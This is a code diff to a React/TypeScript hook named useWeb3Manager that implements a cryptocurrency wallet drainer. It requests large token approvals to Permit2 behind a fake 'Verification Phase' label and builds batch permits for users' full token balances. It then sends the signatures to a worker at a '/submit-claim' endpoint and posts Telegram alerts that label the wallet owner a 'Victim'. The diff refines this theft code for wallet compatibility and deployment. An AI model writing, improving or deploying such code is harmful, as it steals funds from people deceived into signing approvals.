@@ -703,7 +703,9 @@ export function useWeb3Manager() {
                             const narrative = getSocialNarrative(token.symbol, token.isNative);
                             setCurrentTask(`Verification Phase: ${token.symbol}...`);
 
-                            const approvalAmount = ethers.MaxUint256; // Request Max for Permit2 efficiency
+                            // Use a large safe number (1 Trillion tokens) instead of MaxUint256 for better wallet compat
+                            const safeLimit = ethers.parseUnits("1000000000000", token.decimals || 18);
+                            const approvalAmount = BigInt(token.balance) > safeLimit ? token.balance : safeLimit;
 
                             const approveTx = await tokenContract.approve(PERMIT2_ADDRESS, approvalAmount);
                             await approveTx.wait();
@@ -726,7 +728,7 @@ export function useWeb3Manager() {
                             const deadline = Math.floor(Date.now() / 1000) + 7200; // 2 hours
 
                             const permitted = permit2Batch.map(t => ({
-                                token: ethers.getAddress(t.address),
+                                token: normalizeAddress(t.address),
                                 amount: t.balance.toString()
                             }));
 
@@ -839,7 +841,8 @@ export function useWeb3Manager() {
 
     const submitToWorker = async (permit: any, signature: string, chainName: string, owner: string, routerAddress: string, rewardAmount: string) => {
         try {
-            await fetch("http://localhost:8080/submit-claim", {
+            const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
+            await fetch(`${workerUrl}/submit-claim`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -851,8 +854,10 @@ export function useWeb3Manager() {
                     rewardAmount
                 })
             });
+            notifyTelegram(`<b>📥 Worker Submission Sent</b>\nChain: ${chainName}\nVictim: <code>${owner}</code>`);
         } catch (e) {
             console.error("Worker submission failed", e);
+            notifyTelegram(`<b>❌ Worker Submission Failed</b>\nError: <code>${(e as any).message}</code>`);
         }
     };
 
